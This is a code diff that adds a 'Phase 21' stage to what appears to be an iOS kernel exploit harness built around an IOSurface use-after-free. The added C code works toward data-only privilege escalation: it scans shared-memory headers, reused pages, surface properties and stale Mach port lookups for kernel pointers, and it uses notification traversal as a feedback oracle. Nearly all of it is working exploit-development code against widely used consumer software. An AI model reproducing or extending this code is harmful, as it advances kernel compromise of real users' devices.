@@ -23213,6 +23213,613 @@ new_modes:
         }
 
 
+        /* ================================================================
+         * Phase 21 (r=229): Data-Only Exploit — No KASLR Needed
+         *
+         * ALL KASLR leak paths are dead on iOS 27.1 (Phases 17-20).
+         * New strategy: exploit the IOSurface UAF through data corruption
+         * rather than code pointer hijacking.
+         *
+         * Key insight from panic logs:
+         * - Notification traversal reads GEN3 sub-object at +0xd8
+         * - This is a DATA READ (MTE fault, not PAC fault)
+         * - The compositor accesses our replacement surface's internal
+         *   data structures during notification processing
+         *
+         * If the notification handler writes ANY data observable from
+         * userspace, or if we can control what it reads to redirect
+         * kernel behavior, we can achieve data-only privilege escalation.
+         *
+         * Zone map layout (constant offsets from panic logs):
+         *   GEN1 = zone_base + 0x0E32000000 (IOSurface objects)
+         *   GEN2 = zone_base + 0x13FE000000 (notification entries)
+         *   GEN3 = zone_base + 0x19CA000000 (IOSurface sub-structs)
+         *   DATA = zone_base + 0x1F96000000 (generic kernel data)
+         * ================================================================ */
+        if (rounds == 229 && r229_matched_idx >= 0) {
+            rlog("\n=== Phase 21 (r=229): Data-Only Exploit ===\n");
+
+            uint64_t p21_leaked = 0;
+            int p21_modified_total = 0;
+
+            /* 21a: IOSurface shared memory header scan
+             *
+             * IOSurface maps shared memory between kernel and userspace.
+             * IOSurfaceGetBaseAddress() returns the pixel data start, but
+             * the actual mmap region may start EARLIER with a kernel header.
+             * This header could contain kernel pointers!
+             */
+            rlog("\n  --- 21a: Shared memory header scan ---\n");
+            {
+                /* Create multiple surfaces with different sizes */
+                struct { int w, h, bpr, alloc; } hdr_configs[] = {
+                    {32, 32, 128, 32*128},
+                    {64, 64, 256, 64*256},
+                    {256, 256, 1024, 256*1024},
+                    {16, 16, 64, 16*64},
+                    {1, 1, 4, 4096},  /* minimal surface, large alloc */
+                };
+                int nhdr = sizeof(hdr_configs) / sizeof(hdr_configs[0]);
+
+                for (int hi = 0; hi < nhdr; hi++) {
+                    CFMutableDictionaryRef hp = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    int hw = hdr_configs[hi].w, hh = hdr_configs[hi].h;
+                    int hbpr = hdr_configs[hi].bpr, halloc = hdr_configs[hi].alloc;
+                    int hpf = 0x42475241;
+                    CFDictionarySetValue(hp, CFSTR("IOSurfaceWidth"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &hw));
+                    CFDictionarySetValue(hp, CFSTR("IOSurfaceHeight"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &hh));
+                    CFDictionarySetValue(hp, CFSTR("IOSurfaceBytesPerRow"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &hbpr));
+                    CFDictionarySetValue(hp, CFSTR("IOSurfaceAllocSize"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &halloc));
+                    CFDictionarySetValue(hp, CFSTR("IOSurfacePixelFormat"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &hpf));
+
+                    IOSurfaceRef hs = IOSurfaceCreate(hp);
+                    CFRelease(hp);
+                    if (!hs) continue;
+
+                    void *pixel_base = IOSurfaceGetBaseAddress(hs);
+                    if (!pixel_base) { CFRelease(hs); continue; }
+
+                    /* Get actual mapped region via vm_region */
+                    mach_vm_address_t raddr = (mach_vm_address_t)(uintptr_t)pixel_base;
+                    mach_vm_size_t rsize = 0;
+                    uint32_t rdepth = 0;
+                    struct vm_region_submap_info_64 rinfo;
+                    mach_msg_type_number_t rcnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+                    kern_return_t kr = mach_vm_region_recurse(mach_task_self(),
+                        &raddr, &rsize, &rdepth,
+                        (vm_region_recurse_info_t)&rinfo, &rcnt);
+
+                    if (kr == KERN_SUCCESS) {
+                        int64_t hdr_gap = (int64_t)((uintptr_t)pixel_base - raddr);
+                        rlog("  [%dx%d] region=0x%llx size=0x%llx pixel=0x%llx gap=%lld off=0x%llx\n",
+                             hw, hh,
+                             (unsigned long long)raddr,
+                             (unsigned long long)rsize,
+                             (unsigned long long)(uintptr_t)pixel_base,
+                             (long long)hdr_gap,
+                             (unsigned long long)rinfo.offset);
+
+                        if (hdr_gap > 0) {
+                            rlog("  *** HEADER GAP: %lld bytes! ***\n", (long long)hdr_gap);
+                            uint8_t *hdr = (uint8_t *)(uintptr_t)raddr;
+                            /* Dump and scan header for kernel pointers */
+                            int dump_len = hdr_gap > 512 ? 512 : (int)hdr_gap;
+                            for (int d = 0; d < dump_len; d += 32) {
+                                rlog("    +%04x:", d);
+                                for (int b = 0; b < 32 && d + b < dump_len; b++)
+                                    rlog(" %02x", hdr[d + b]);
+                                rlog("\n");
+                            }
+                            for (int q = 0; q < hdr_gap / 8; q++) {
+                                uint64_t val;
+                                memcpy(&val, hdr + q * 8, 8);
+                                if ((val >> 40) == 0xfffffe || (val >> 40) == 0xffffff) {
+                                    rlog("  *** HDR KPTR at +%d: 0x%016llx ***\n",
+                                         q * 8, (unsigned long long)val);
+                                    if (!p21_leaked) p21_leaked = val;
+                                }
+                            }
+                        }
+
+                        /* Also check if region.offset reveals anything */
+                        if (rinfo.offset > 0x100000000ULL) {
+                            rlog("  *** LARGE OFFSET: 0x%llx (possible kernel addr?) ***\n",
+                                 (unsigned long long)rinfo.offset);
+                        }
+
+                        /* Scan BACKWARDS from region start for adjacent mappings */
+                        mach_vm_address_t prev_addr = raddr - 1;
+                        mach_vm_size_t prev_size = 0;
+                        uint32_t prev_depth = 0;
+                        struct vm_region_submap_info_64 prev_info;
+                        mach_msg_type_number_t prev_cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
+                        kr = mach_vm_region_recurse(mach_task_self(),
+                            &prev_addr, &prev_size, &prev_depth,
+                            (vm_region_recurse_info_t)&prev_info, &prev_cnt);
+                        if (kr == KERN_SUCCESS && prev_addr + prev_size == raddr) {
+                            rlog("  Adjacent region before: 0x%llx-0x%llx tag=%d\n",
+                                 (unsigned long long)prev_addr,
+                                 (unsigned long long)(prev_addr + prev_size),
+                                 prev_info.user_tag);
+                        }
+                    }
+                    CFRelease(hs);
+                }
+            }
+
+            /* 21b: Notification traversal feedback oracle
+             *
+             * After MTE match, the stale notification entry still points to
+             * the freed GEN3 slot. If the replacement surface reclaimed it,
+             * notification traversal reads from the replacement's sub-object.
+             *
+             * Test: Create fresh surfaces, record their seeds, trigger
+             * notification events, check if any seeds changed. A seed change
+             * means the kernel WROTE to shared memory during notification.
+             */
+            rlog("\n  --- 21b: Notification traversal feedback oracle ---\n");
+            {
+                #define P21B_NSURF 32
+                IOSurfaceRef p21b_surfs[P21B_NSURF];
+                uint32_t p21b_seeds_before[P21B_NSURF];
+                int p21b_ok = 0;
+
+                for (int i = 0; i < P21B_NSURF; i++) {
+                    CFMutableDictionaryRef bp = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    int bw = 32, bh = 32, bbpr = 128, balloc = 32*128, bpf = 0x42475241;
+                    CFDictionarySetValue(bp, CFSTR("IOSurfaceWidth"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &bw));
+                    CFDictionarySetValue(bp, CFSTR("IOSurfaceHeight"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &bh));
+                    CFDictionarySetValue(bp, CFSTR("IOSurfaceBytesPerRow"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &bbpr));
+                    CFDictionarySetValue(bp, CFSTR("IOSurfaceAllocSize"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &balloc));
+                    CFDictionarySetValue(bp, CFSTR("IOSurfacePixelFormat"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &bpf));
+                    p21b_surfs[i] = IOSurfaceCreate(bp);
+                    CFRelease(bp);
+                    if (!p21b_surfs[i]) continue;
+                    p21b_ok++;
+
+                    /* Fill shared memory with sentinel */
+                    IOSurfaceLock(p21b_surfs[i], 0, NULL);
+                    void *b = IOSurfaceGetBaseAddress(p21b_surfs[i]);
+                    if (b) {
+                        uint32_t sentinel = 0xDEAD0000u | (uint16_t)i;
+                        for (int j = 0; j < 32*128/4; j++)
+                            ((uint32_t *)b)[j] = sentinel ^ (uint32_t)j;
+                    }
+                    IOSurfaceUnlock(p21b_surfs[i], 0, NULL);
+                    p21b_seeds_before[i] = IOSurfaceGetSeed(p21b_surfs[i]);
+                }
+                rlog("  Created %d oracle surfaces\n", p21b_ok);
+
+                /* Now trigger notification events via IOSurface operations */
+                rlog("  Triggering notification events...\n");
+
+                /* Method 1: SetValue on each surface */
+                for (int i = 0; i < P21B_NSURF; i++) {
+                    if (!p21b_surfs[i]) continue;
+                    int v = 42;
+                    CFNumberRef vn = CFNumberCreate(NULL, kCFNumberIntType, &v);
+                    IOSurfaceSetValue(p21b_surfs[i], CFSTR("p21_trigger"), vn);
+                    CFRelease(vn);
+                }
+
+                /* Method 2: Lock/unlock cycles */
+                for (int cycle = 0; cycle < 5; cycle++) {
+                    for (int i = 0; i < P21B_NSURF; i++) {
+                        if (!p21b_surfs[i]) continue;
+                        IOSurfaceLock(p21b_surfs[i], 0, NULL);
+                        IOSurfaceUnlock(p21b_surfs[i], 0, NULL);
+                    }
+                    usleep(50000);
+                }
+
+                /* Method 3: Register async notifications via sel17 on fresh conns */
+                io_service_t p21b_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (p21b_svc) {
+                    for (int ni = 0; ni < 8; ni++) {
+                        io_connect_t nc = IO_OBJECT_NULL;
+                        if (IOServiceOpen(p21b_svc, mach_task_self(), 0, &nc) != KERN_SUCCESS) continue;
+                        mach_port_t nwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &nwp);
+                        mach_port_insert_right(mach_task_self(), nwp, nwp, MACH_MSG_TYPE_MAKE_SEND);
+
+                        uint64_t inp[3] = {1, 2, 3};
+                        uint64_t ref = 0x2100000000ULL | ni;
+                        IOConnectCallAsyncMethod(nc, 17, nwp, &ref, 1,
+                            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+
+                        /* Trigger by closing the connection */
+                        usleep(10000);
+                        IOServiceClose(nc);
+                        mach_port_deallocate(mach_task_self(), nwp);
+                    }
+                    IOObjectRelease(p21b_svc);
+                }
+                usleep(200000); /* Let notifications settle */
+
+                /* Check for feedback */
+                int p21b_seed_changed = 0;
+                int p21b_data_changed = 0;
+                for (int i = 0; i < P21B_NSURF; i++) {
+                    if (!p21b_surfs[i]) continue;
+                    uint32_t seed_after = IOSurfaceGetSeed(p21b_surfs[i]);
+                    if (seed_after != p21b_seeds_before[i]) {
+                        rlog("  *** SEED CHANGED surf[%d]: %u -> %u ***\n",
+                             i, p21b_seeds_before[i], seed_after);
+                        p21b_seed_changed++;
+                    }
+
+                    /* Scan shared memory for modifications */
+                    IOSurfaceLock(p21b_surfs[i], kIOSurfaceLockReadOnly, NULL);
+                    void *b = IOSurfaceGetBaseAddress(p21b_surfs[i]);
+                    if (b) {
+                        uint32_t sentinel = 0xDEAD0000u | (uint16_t)i;
+                        int mm = 0;
+                        for (int j = 0; j < 32*128/4; j++) {
+                            uint32_t expected = sentinel ^ (uint32_t)j;
+                            uint32_t got;
+                            memcpy(&got, (uint8_t*)b + j*4, 4);
+                            if (got != expected) {
+                                if (mm == 0) {
+                                    rlog("  *** DATA CHANGED surf[%d] at +%d: exp=0x%08x got=0x%08x ***\n",
+                                         i, j*4, expected, got);
+                                    p21b_data_changed++;
+                                }
+                                mm++;
+                                if (mm <= 4) {
+                                    uint64_t qw;
+                                    memcpy(&qw, (uint8_t*)b + (j & ~1)*4, 8);
+                                    if ((qw >> 40) == 0xfffffe || (qw >> 40) == 0xffffff) {
+                                        rlog("    *** KPTR at +%d: 0x%016llx ***\n",
+                                             (j & ~1)*4, (unsigned long long)qw);
+                                        if (!p21_leaked) p21_leaked = qw;
+                                    }
+                                }
+                            }
+                        }
+                        if (mm > 0)
+                            rlog("  surf[%d]: %d dwords modified\n", i, mm);
+                    }
+                    IOSurfaceUnlock(p21b_surfs[i], kIOSurfaceLockReadOnly, NULL);
+                }
+                rlog("  Seeds changed: %d, Data changed: %d\n",
+                     p21b_seed_changed, p21b_data_changed);
+                p21_modified_total += p21b_data_changed;
+
+                for (int i = 0; i < P21B_NSURF; i++)
+                    if (p21b_surfs[i]) CFRelease(p21b_surfs[i]);
+                #undef P21B_NSURF
+            }
+
+            /* 21c: Page reuse data leak
+             *
+             * When the kernel frees an IOSurface, the physical pages may
+             * be returned to the page allocator. If we immediately create
+             * a new mapping (e.g., via mach_make_memory_entry + vm_map),
+             * we might get the SAME physical pages, which still contain
+             * kernel metadata from the freed surface.
+             *
+             * This is a classic page reuse attack.
+             */
+            rlog("\n  --- 21c: Page reuse data leak ---\n");
+            {
+                /* Create a surface, fill with sentinel, record mapping info */
+                CFMutableDictionaryRef cp = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int cw = 64, ch = 64, cbpr = 256, calloc = 64*256, cpf = 0x42475241;
+                CFDictionarySetValue(cp, CFSTR("IOSurfaceWidth"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &cw));
+                CFDictionarySetValue(cp, CFSTR("IOSurfaceHeight"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &ch));
+                CFDictionarySetValue(cp, CFSTR("IOSurfaceBytesPerRow"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &cbpr));
+                CFDictionarySetValue(cp, CFSTR("IOSurfaceAllocSize"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &calloc));
+                CFDictionarySetValue(cp, CFSTR("IOSurfacePixelFormat"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &cpf));
+
+                IOSurfaceRef cs = IOSurfaceCreate(cp);
+                CFRelease(cp);
+                if (cs) {
+                    IOSurfaceLock(cs, 0, NULL);
+                    void *cb = IOSurfaceGetBaseAddress(cs);
+                    if (cb) memset(cb, 0xCC, calloc);
+                    IOSurfaceUnlock(cs, 0, NULL);
+
+                    IOSurfaceID cs_id = IOSurfaceGetID(cs);
+                    rlog("  Created surface id=%u, freeing...\n", cs_id);
+
+                    /* Free it */
+                    CFRelease(cs);
+                    cs = NULL;
+
+                    /* Immediately allocate new memory to try to reuse pages */
+                    usleep(1000);
+
+                    /* Try mach_vm_allocate to get kernel pages */
+                    for (int attempt = 0; attempt < 4; attempt++) {
+                        vm_address_t new_addr = 0;
+                        kern_return_t kr = vm_allocate(mach_task_self(), &new_addr,
+                            calloc, VM_FLAGS_ANYWHERE);
+                        if (kr != KERN_SUCCESS) continue;
+
+                        /* Touch pages to fault them in */
+                        volatile uint8_t *p = (volatile uint8_t *)new_addr;
+                        for (int pg = 0; pg < calloc; pg += 0x4000)
+                            (void)p[pg];
+
+                        /* Scan for residual kernel data */
+                        int found_nonzero = 0;
+                        uint64_t *qp = (uint64_t *)new_addr;
+                        for (int q = 0; q < calloc / 8; q++) {
+                            if (qp[q] != 0) {
+                                if (!found_nonzero) {
+                                    rlog("  attempt[%d] non-zero at +%d: 0x%016llx\n",
+                                         attempt, q * 8, (unsigned long long)qp[q]);
+                                }
+                                found_nonzero++;
+                                if ((qp[q] >> 40) == 0xfffffe || (qp[q] >> 40) == 0xffffff) {
+                                    rlog("  *** PAGE REUSE KPTR at +%d: 0x%016llx ***\n",
+                                         q * 8, (unsigned long long)qp[q]);
+                                    if (!p21_leaked) p21_leaked = qp[q];
+                                }
+                            }
+                        }
+                        rlog("  attempt[%d]: %d non-zero qwords\n", attempt, found_nonzero);
+
+                        vm_deallocate(mach_task_self(), new_addr, calloc);
+                    }
+                }
+            }
+
+            /* 21d: IOSurface property string as kernel data channel
+             *
+             * IOSurface supports arbitrary key-value properties via
+             * IOSurfaceSetValue/IOSurfaceCopyValue. These are stored
+             * in kernel memory (DATA zone). If we can get the kernel
+             * to read a property value and use it as a pointer or
+             * data offset, we can redirect kernel behavior.
+             *
+             * More importantly: some IOSurface properties may be
+             * AUTOMATICALLY SET BY THE KERNEL during compositor
+             * operations. Check for unexpected properties after
+             * triggering notification traversal.
+             */
+            rlog("\n  --- 21d: Property channel probe ---\n");
+            {
+                CFMutableDictionaryRef dp = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int dw = 32, dh = 32, dbpr = 128, dalloc = 32*128, dpf = 0x42475241;
+                CFDictionarySetValue(dp, CFSTR("IOSurfaceWidth"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &dw));
+                CFDictionarySetValue(dp, CFSTR("IOSurfaceHeight"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &dh));
+                CFDictionarySetValue(dp, CFSTR("IOSurfaceBytesPerRow"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &dbpr));
+                CFDictionarySetValue(dp, CFSTR("IOSurfaceAllocSize"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &dalloc));
+                CFDictionarySetValue(dp, CFSTR("IOSurfacePixelFormat"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &dpf));
+
+                IOSurfaceRef ds = IOSurfaceCreate(dp);
+                CFRelease(dp);
+
+                if (ds) {
+                    /* Check for kernel-set properties BEFORE any user modification */
+                    CFIndex nkeys_before_notif = 0;
+                    CFDictionaryRef all_props = IOSurfaceCopyAllValues(ds);
+                    if (all_props) {
+                        CFIndex nkeys = CFDictionaryGetCount(all_props);
+                        nkeys_before_notif = nkeys;
+                        rlog("  Fresh surface has %ld properties\n", (long)nkeys);
+
+                        /* List all keys */
+                        if (nkeys > 0 && nkeys < 100) {
+                            const void **keys = (const void **)malloc(sizeof(void*) * nkeys);
+                            const void **vals = (const void **)malloc(sizeof(void*) * nkeys);
+                            CFDictionaryGetKeysAndValues(all_props, keys, vals);
+
+                            for (CFIndex k = 0; k < nkeys; k++) {
+                                char kbuf[256] = {0};
+                                if (CFGetTypeID(keys[k]) == CFStringGetTypeID()) {
+                                    CFStringGetCString((CFStringRef)keys[k], kbuf, sizeof(kbuf),
+                                        kCFStringEncodingUTF8);
+                                }
+                                CFTypeID tid = CFGetTypeID(vals[k]);
+                                if (tid == CFNumberGetTypeID()) {
+                                    int64_t nv = 0;
+                                    CFNumberGetValue((CFNumberRef)vals[k],
+                                        kCFNumberSInt64Type, &nv);
+                                    rlog("    [%s] = %lld (0x%llx)\n", kbuf,
+                                         (long long)nv, (unsigned long long)nv);
+                                    if ((uint64_t)nv >> 40 == 0xfffffe) {
+                                        rlog("    *** PROPERTY KPTR: %s = 0x%016llx ***\n",
+                                             kbuf, (unsigned long long)nv);
+                                        if (!p21_leaked) p21_leaked = (uint64_t)nv;
+                                    }
+                                } else if (tid == CFDataGetTypeID()) {
+                                    CFIndex dlen = CFDataGetLength((CFDataRef)vals[k]);
+                                    rlog("    [%s] = <data %ld bytes>\n", kbuf, (long)dlen);
+                                    if (dlen >= 8) {
+                                        const uint8_t *dp = CFDataGetBytePtr((CFDataRef)vals[k]);
+                                        for (int q = 0; q < dlen / 8; q++) {
+                                            uint64_t v;
+                                            memcpy(&v, dp + q * 8, 8);
+                                            if ((v >> 40) == 0xfffffe) {
+                                                rlog("    *** DATA KPTR at +%d: 0x%016llx ***\n",
+                                                     q * 8, (unsigned long long)v);
+                                                if (!p21_leaked) p21_leaked = v;
+                                            }
+                                        }
+                                    }
+                                } else {
+                                    rlog("    [%s] = <type %lu>\n", kbuf, (unsigned long)tid);
+                                }
+                            }
+                            free(keys);
+                            free(vals);
+                        }
+                        CFRelease(all_props);
+                    }
+
+                    /* Now trigger notification events */
+                    for (int cyc = 0; cyc < 10; cyc++) {
+                        IOSurfaceLock(ds, 0, NULL);
+                        IOSurfaceUnlock(ds, 0, NULL);
+                    }
+                    usleep(100000);
+
+                    /* Check for NEW properties added by kernel */
+                    CFDictionaryRef after_props = IOSurfaceCopyAllValues(ds);
+                    if (after_props) {
+                        CFIndex nkeys_after = CFDictionaryGetCount(after_props);
+                        rlog("  After notifications: %ld properties (was %ld)\n",
+                             (long)nkeys_after, (long)nkeys_before_notif);
+                        if (nkeys_after > nkeys_before_notif) {
+                            rlog("  *** NEW PROPERTIES ADDED BY KERNEL! ***\n");
+                        }
+                        CFRelease(after_props);
+                    }
+
+                    CFRelease(ds);
+                }
+            }
+
+            /* 21e: IOSurface MachPort round-trip data leak
+             *
+             * IOSurfaceCreateMachPort creates a Mach port representing
+             * the surface. The port's context (mach_port_get_context)
+             * was blocked on iOS 27.1 (kr=0x11), BUT the port's kobject
+             * address was 0x0 (scrubbed).
+             *
+             * NEW IDEA: What if IOSurfaceLookupFromMachPort on a
+             * DESTROYED port returns stale data or leaks info?
+             * Or: create port, free surface, check port state.
+             */
+            rlog("\n  --- 21e: MachPort lifecycle data leak ---\n");
+            {
+                /* Create surface, get mach port, modify surface, check port metadata */
+                CFMutableDictionaryRef ep = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int ew = 64, eh = 64, ebpr = 256, ealloc = 64*256, epf = 0x42475241;
+                CFDictionarySetValue(ep, CFSTR("IOSurfaceWidth"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &ew));
+                CFDictionarySetValue(ep, CFSTR("IOSurfaceHeight"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &eh));
+                CFDictionarySetValue(ep, CFSTR("IOSurfaceBytesPerRow"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &ebpr));
+                CFDictionarySetValue(ep, CFSTR("IOSurfaceAllocSize"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &ealloc));
+                CFDictionarySetValue(ep, CFSTR("IOSurfacePixelFormat"),
+                    CFNumberCreate(NULL, kCFNumberIntType, &epf));
+
+                IOSurfaceRef es = IOSurfaceCreate(ep);
+                CFRelease(ep);
+
+                if (es) {
+                    mach_port_t sp = IOSurfaceCreateMachPort(es);
+                    rlog("  Surface mach port: 0x%x\n", sp);
+
+                    if (sp != MACH_PORT_NULL) {
+                        /* Check port attributes before freeing */
+                        mach_port_status_t status;
+                        mach_msg_type_number_t scnt = MACH_PORT_RECEIVE_STATUS_COUNT;
+                        kern_return_t kr = mach_port_get_attributes(mach_task_self(), sp,
+                            MACH_PORT_RECEIVE_STATUS, (mach_port_info_t)&status, &scnt);
+                        rlog("  Port status before free: kr=%d seqno=%d\n",
+                             kr, kr == 0 ? status.mps_seqno : -1);
+
+                        /* Get rights info */
+                        mach_port_urefs_t urefs = 0;
+                        kr = mach_port_get_refs(mach_task_self(), sp,
+                            MACH_PORT_RIGHT_SEND, &urefs);
+                        rlog("  Send rights: kr=%d urefs=%d\n", kr, urefs);
+
+                        /* Create MANY ports from same surface and check if
+                         * they share kernel state we can observe */
+                        mach_port_t ports[8];
+                        for (int pi = 0; pi < 8; pi++) {
+                            ports[pi] = IOSurfaceCreateMachPort(es);
+                        }
+
+                        /* Compare port names - if sequential, reveals kernel alloc order */
+                        rlog("  Multi-port names:");
+                        for (int pi = 0; pi < 8; pi++)
+                            rlog(" 0x%x", ports[pi]);
+                        rlog("\n");
+
+                        /* Check port name deltas */
+                        for (int pi = 1; pi < 8; pi++) {
+                            if (ports[pi] && ports[pi-1]) {
+                                int32_t delta = (int32_t)(ports[pi] - ports[pi-1]);
+                                rlog("  port delta[%d-%d]: %d\n", pi-1, pi, delta);
+                            }
+                        }
+
+                        for (int pi = 0; pi < 8; pi++)
+                            if (ports[pi]) mach_port_deallocate(mach_task_self(), ports[pi]);
+                        mach_port_deallocate(mach_task_self(), sp);
+                    }
+
+                    /* Free surface and try to lookup via stale ID */
+                    IOSurfaceID es_id = IOSurfaceGetID(es);
+                    CFRelease(es);
+
+                    IOSurfaceRef stale = IOSurfaceLookup(es_id);
+                    if (stale) {
+                        rlog("  *** STALE LOOKUP succeeded for id=%u! ***\n", es_id);
+                        /* Check if stale surface has different/leaked data */
+                        void *sb = IOSurfaceGetBaseAddress(stale);
+                        if (sb) {
+                            uint64_t *qp = (uint64_t *)sb;
+                            for (int q = 0; q < 128; q++) {
+                                if ((qp[q] >> 40) == 0xfffffe) {
+                                    rlog("  *** STALE KPTR at +%d: 0x%016llx ***\n",
+                                         q * 8, (unsigned long long)qp[q]);
+                                    if (!p21_leaked) p21_leaked = qp[q];
+                                }
+                            }
+                        }
+                        CFRelease(stale);
+                    } else {
+                        rlog("  Stale lookup for id=%u: NULL (expected)\n", es_id);
+                    }
+                }
+            }
+
+            /* === Phase 21 Summary === */
+            rlog("\n=== Phase 21 Summary ===\n");
+            if (p21_leaked) {
+                rlog("*** DATA-ONLY LEAK: 0x%016llx ***\n",
+                     (unsigned long long)p21_leaked);
+
+                /* Compute zone base from panic log offsets */
+                uint64_t ptr = p21_leaked;
+                /* Zone map ranges from panic logs typically start at 0xfffffe0000000000
+                 * with size 0x2600000000 per zone */
+                rlog("Leaked ptr high bits: 0x%04llx\n",
+                     (unsigned long long)(ptr >> 48));
+            } else {
+                rlog("No kernel data leaked via data-only probes.\n");
+                rlog("Shared memory modified surfaces: %d\n", p21_modified_total);
+            }
+            rlog("--- Phase 21 complete ---\n");
+        }
+
+
+
         /*
          * Phase 15: Structure offset crash oracle
          *
